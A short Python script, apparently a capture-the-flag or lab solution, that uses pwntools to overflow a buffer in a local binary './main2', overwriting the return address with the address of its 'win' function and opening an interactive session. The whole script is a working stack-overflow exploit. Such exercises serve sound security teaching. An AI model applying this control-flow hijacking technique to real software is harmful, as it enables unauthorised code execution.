import pwn

elf = pwn.ELF("./main2")
p = elf.process()

win_addr = elf.symbols['win']
print(f"win_addr={hex(win_addr)}")

p.sendline(b"a"*16 + pwn.p64(0) + pwn.p64(win_addr))
p.interactive()